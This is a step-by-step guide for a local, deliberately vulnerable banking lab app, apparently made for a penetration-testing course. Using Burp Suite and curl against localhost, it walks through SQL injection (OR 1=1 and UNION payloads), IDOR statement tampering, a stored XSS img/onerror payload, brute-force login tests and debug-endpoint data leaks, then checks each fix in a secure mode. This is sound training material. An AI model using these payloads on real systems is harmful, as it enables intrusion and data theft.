# LAB EXECUTION & TESTING GUIDE
## Step-by-Step Instructions for Kali Linux, Burp Suite, and Docker

This technical guide provides step-by-step instructions for launching the SecureBank Labs environment, routing traffic through **Burp Suite** / **Kali Linux**, executing non-destructive Proof-of-Concepts (PoCs), and verifying the remediated state.

---

## 1. Quick Start / Environment Launch

You can run the application either directly via Node.js or inside an isolated Docker container.

### Option A: Direct Local Execution (Recommended for Fast Setup)
1. Open PowerShell or Terminal in the project root:
   ```bash
   cd "c:\Users\swaya\OneDrive\Desktop\VAPT LAB CA"
   ```
2. Start the application:
   ```bash
   npm start
   ```
3. Open your browser and navigate to:
   ```
   http://127.0.0.1:3000
   ```

### Option B: Docker Container Isolated Execution
1. Ensure Docker Desktop is running.
2. Build and run via Docker Compose:
   ```bash
   docker-compose up --build
   ```
3. The lab will be strictly bound to `127.0.0.1:3000`.

---

## 2. Configuring Burp Suite for Interception

1. **Launch Burp Suite Community Edition** on your host or in Kali Linux.
2. Under **Proxy -> Proxy settings**, ensure the proxy listener is active on `127.0.0.1:8080`.
3. In Firefox / Chrome, set the HTTP proxy to `127.0.0.1:8080` (or use the built-in Chromium browser in Burp Suite).
4. **Important note for localhost:** Under browser proxy settings, ensure `127.0.0.1` and `localhost` are **NOT** excluded from proxying (clear the "No proxy for" field).
5. Turn **Intercept ON** in Burp Suite to capture incoming and outgoing HTTP requests.

---

## 3. Hands-On Exploitation & Verification Manual

---

### Station 1: SQL Injection (SQLi)
* **Target Endpoint:** `GET /api/users/search?q={query}`
* **Methodology:**
  1. In the search box, test a standard input: `alice`. Observe normal JSON output.
  2. Send the request to **Burp Repeater**.
  3. Change the parameter to:
     ```
     /api/users/search?q='%20OR%20'1'='1
     ```
  4. Send the request. Observe the response containing all rows from the `users` table including `admin`.
  5. Test an alternative Union-based payload:
     ```
     /api/users/search?q='%20UNION%20SELECT%2099,'pwned','hacked@lab','hacker',999999%20--
     ```
  6. **Remediation Verification:**
     - Toggle the switch to **Secure Mode** (or click `POST /api/lab/toggle-mode`).
     - Resend the Repeater request. Observe that the query returns `[]` empty results without executing injected commands.

---

### Station 2: Broken Object Level Authorization (IDOR)
* **Target Endpoint:** `GET /api/statements/:id`
* **Methodology:**
  1. Open Burp Suite Repeater.
  2. Send a request as regular user Alice (User ID 2) for her own statement:
     ```http
     GET /api/statements/2 HTTP/1.1
     Host: 127.0.0.1:3000
     x-user-id: 2
     ```
     *Response:* Alice views her consulting payout ($3,500).
  3. Now tamper with the path parameter to request Statement ID 1 (Executive Admin statement):
     ```http
     GET /api/statements/1 HTTP/1.1
     Host: 127.0.0.1:3000
     x-user-id: 2
     ```
  4. *Vulnerable Mode Response:* The server returns Admin's $120,000 dividend statement.
  5. **Remediation Verification:**
     - Toggle to **Secure Mode**.
     - Resend the tampered request. The server responds with `HTTP 403 Forbidden` (`Access Denied: You do not have permission to view this financial document`).

---

### Station 3: Stored Cross-Site Scripting (XSS)
* **Target Endpoint:** `POST /api/feedback`
* **Methodology:**
  1. Submit the following payload in the feedback form or via cURL:
     ```bash
     curl -X POST http://127.0.0.1:3000/api/feedback \
       -H "Content-Type: application/json" \
       -d '{"author":"tester","category":"Bug","message":"<img src=x onerror=alert(document.domain)>"}'
     ```
  2. Refresh the web page feed or query `GET /api/feedback`.
  3. In vulnerable mode, the payload executes in the browser context.
  4. **Remediation Verification:**
     - Toggle to **Secure Mode**.
     - Notice that retrieved feedback entries are converted to HTML entities (`&lt;img src=x onerror=alert(document.domain)&gt;`) and rendered harmlessly as text.

---

### Station 4: Broken Authentication & PII Leak
* **Target Endpoint:** `POST /api/auth/login`
* **Methodology:**
  1. Send a login request in Burp Suite:
     ```http
     POST /api/auth/login HTTP/1.1
     Host: 127.0.0.1:3000
     Content-Type: application/json

     {
       "username": "alice",
       "password": "AlicePassword123"
     }
     ```
  2. In Vulnerable Mode, inspect the response: Notice that the JSON exposes:
     - `password_plain`
     - `password_md5`
     - `national_id` (SSN)
  3. Test brute-force resilience by sending 10 rapid incorrect passwords to `POST /api/auth/login`. In vulnerable mode, no lockout occurs.
  4. **Remediation Verification:**
     - Toggle to **Secure Mode**.
     - Send 5 incorrect passwords. On the 5th attempt, the API responds with `HTTP 429 Too Many Requests: Account temporarily locked for 60 seconds`.
     - When logging in with valid credentials, sensitive fields are completely omitted from the response.

---

### Station 5: Security Misconfiguration & Stack Trace Leak
* **Target Endpoint:** `GET /api/system/debug` & `GET /api/system/crash-test`
* **Methodology:**
  1. Execute in terminal:
     ```bash
     curl -i http://127.0.0.1:3000/api/system/debug
     ```
  2. Observe the response: Server leaks `process.env`, internal file paths, and secret database maintenance tokens (`SEC-MAINT-TOKEN-9941-XJ8`).
  3. Notice response header: `X-Powered-By: Express/4.21.2 (VulnLab-NodeJS)`.
  4. Query crash test:
     ```bash
     curl -i http://127.0.0.1:3000/api/system/crash-test
     ```
     Full JavaScript error stack traces with line numbers are returned.
  5. **Remediation Verification:**
     - Toggle to **Secure Mode**.
     - `/api/system/debug` now returns `HTTP 404 Not Found`.
     - `/api/system/crash-test` returns a sanitized generic error with a unique Incident ID (`INC-XXXX`).
     - Notice response headers now include `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, and `X-Powered-By` is stripped.

---

## 4. Resetting the Laboratory Database

At any point during testing or before recording your presentation, you can restore all tables to their clean initial seed state:
* Click the **🔄 Reset DB** button in the top navigation bar.
* Or execute via cURL / terminal:
  ```bash
  curl -X POST http://127.0.0.1:3000/api/lab/reset-db
  ```
